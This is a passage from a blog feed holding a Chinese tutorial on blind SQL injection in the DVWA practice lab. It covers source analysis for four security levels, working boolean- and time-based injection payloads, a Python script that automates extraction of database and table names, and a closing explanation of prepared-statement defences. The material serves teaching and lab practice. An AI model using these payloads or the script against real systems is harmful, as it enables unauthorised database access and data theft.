    <summary type="html">&lt;p&gt;本文介绍了文件包含漏洞，并分析了dvwa文件包含漏洞四个安全级别的源码。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="DVWA" scheme="https://yiwenzhe.com/tags/DVWA/"/>
    
    <category term="文件包含" scheme="https://yiwenzhe.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA(八)：SQL-Injection（Blind盲注）</title>
    <link href="https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/"/>
    <id>https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/</id>
    <published>2021-06-28T13:29:05.000Z</published>
    <updated>2022-10-20T05:57:42.545Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><p>&emsp;&emsp;普通sql注入会显示出成功信息或者sql错误信息，攻击者可以根据回显来窃取数据库信息。而一般情况网站管理员不将数据库错误信息直接返回，而是返回自己设定的信息或者不显示，因此攻击者无法确定注入的sql语句是否正确，也无法得到库名、表名等。<br>&emsp;&emsp;根据页面不同的响应方式，SQL盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注。<br>&emsp;&emsp;<strong>基于布尔的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，如数据库中库名、表名长度是否相等、字段名是否相同、字段名某个字符是否相等，根据服务器返回的结果（成功或失败），不断调整判断条件中的数值直到命中。此类注入需要服务器回显部分信息，如语句执行成功还是失败等。<br>&emsp;&emsp;<strong>基于时间的盲注：</strong><br>&emsp;&emsp;通过构造判断条件，使用sleep()函数，当判断为true时sleep一段时间，false时不执行。通过服务器的响应时间判断语句是否命中。此类注入不需要服务器回显信息，只需要响应时间即可。<br>&emsp;&emsp;<strong>基于错误的盲注：</strong><br>&emsp;&emsp;依赖于几个报错函数，如floor和count、group by冲突报错，UpdateXml()函数、ExtracValue()函数等，执行错误返回数据库信息。</p><h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;和七中的普通sql注入不同，这里并没有使用mysqli_error返回错误信息。无论sql语句是错误还是正确，只能得到exists或者missing两种结果。<br>&emsp;&emsp;DVWA中只有如下两种显示：</p><div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/1.png" width="350" height="122"></div><p><br></p><div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/2.png" width="350" height="115"></div><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>获取数据库名长度</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 #    显示MISSING</span></span><br><span class="line">1&#x27; and length(database())&gt;3 #    显示exists</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=4 #    显示exists</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里使用length函数获取长度，与设定数值比较，一步步测试，得到库名长度为4。</p><p><strong>获取数据库名</strong></p><p>&emsp;&emsp;mysql中有字符串函数 substr()，可以从指定位置开始截取指定长度的字符串，其参数为substr(string string,num start,num length)。其中string为字符串，start为起始位置，length为长度。<br>&emsp;&emsp;因此可以使用如下语句测试每个字符：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr(database(),1,1)=&#x27;</span>a<span class="string">&#x27;#   测试第一个字符是否为a</span></span><br><span class="line">1&#x27; and substr(database(),1,1)=&#x27;b&#x27;#   测试第一个字符是否为b</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;mysql中也有ascii()函数，可以返回字符的ascii码值，也可使用如下语句来测试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;80#</span></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;120#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后获取到当前连接数据库的名称为：dvwa。</p><p><strong>获取数据库表名</strong></p><p>&emsp;&emsp;通过信息数据库 information_schema 可以得到数据库中的表、字段等信息，具体如何获取请参考文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a></p><p>&emsp;&emsp;代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">猜测表的个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10 # </span></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&lt;5 # </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测表名长度</span></span><br><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10 #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测第一个表名</span></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #</span><br><span class="line">猜测第二个表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后获取到表个数为2，表名分别为guestbook和users。</p><p><strong>获取表中字段名</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">猜测字段个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)&gt;10 #</span></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #</span><br><span class="line"></span><br><span class="line">猜测字段长度</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1))=7 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测字段名称</span></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117 #</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;就算猜到了字段名称，字段具体值要一个个猜中还是很困难的，只能凭借用户习惯和运气来测试，这也是sql盲注的难点。sql盲注及其耗费时间，往往需要编写脚本来批量测试。这里给出一个python脚本如下（脚本来源<a href="https://blog.csdn.net/qq_42181428/article/details/88075784" target="_blank">以dvwa为例学习简单sql布尔盲注的详细脚本</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">#payload应该包括所有大小写字母和其他字符，这里是简化使用</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span> </span><br><span class="line">#此处提交需要用户登录的cookie，可以使用burpsuit抓取</span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;security=low; PHPSESSID=1rgudn49lotqe6hedvv6uu7ioj&#x27;</span>&#125;</span><br><span class="line">#url为dvwa中sql盲注地址</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    # 所有payload里的注释#要用url编码%23表示，因为这是直接添加在url里的</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;database_lenth: &#x27;</span>+str(databaseLen))</span><br><span class="line">databse_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">&#x27;?id=1\&#x27; and substr(database(),&#x27;</span>+str(j)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(i)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">&#x27;database_name: &#x27;</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"># 3.爆破表的个数</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">&#x27;?id=1\&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;tableNum: &#x27;</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"># 4.爆出所有的表名</span><br><span class="line"># (1)爆出各个表名的长度</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),1))=&#x27;</span>+str(i)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_length: &#x27;</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            # (2)内部循环爆破每个表的表名</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    table_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),&#x27;</span>+str(m)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(n)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_name: &#x27;</span>+table_name)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;结果如下：</p><div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/3.png" width="300" height="201"></div><p>&emsp;&emsp;以上例子都是基于布尔的盲注，也可以使用基于时间的盲注获取信息。输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1 )# </span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;当length正确时，网页会加载至少5秒；当length错误时，网页很快就返回。如下图，可以看到延迟时间为5.02秒。</p><div align="center"><img src="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/4.png"></div><h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;中级代码中，使用POST获取传入参数，同时使用mysqli_real_escape_string来过滤一些特殊字符。所以当使用带引号的变量’dvwa’或者’users’时，可以使用16进制来代替。<br>&emsp;&emsp;中级的盲注过程和低级类似，其中中级需要POST方法提交，并注意一些字符的绕过，可参考上一篇文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a>。</p><h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount 随机延时</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;查询语句中使用Limit 1限制结果为一条，可以直接使用#注释该限制。同时在查询失败时，会使用sleep随机延时0-5秒，所以不能使用基于时间的盲注，可以使用基于布尔的盲注，和安全级别low过程类似。</p><h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Impossible代码中使用 Anti-CSRF token防止CSRF攻击，使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。</p><p>&emsp;&emsp;使用db-&gt;prepare和data-&gt;bindParam预处理sql语句，使得传入的变量被固定为数据，因此也就不会当做代码执行。最后验证sql语句查询结果数目$data-&gt;rowCount() == 1，只有为一条时才输出，有效防止爆库。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单分析了dvwa中sql盲注四个安全级别的源码，本文可和上一篇sql注入结合理解，注入方式基本相同。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="DVWA" scheme="https://yiwenzhe.com/tags/DVWA/"/>
    
    <category term="sql盲注" scheme="https://yiwenzhe.com/tags/sql%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
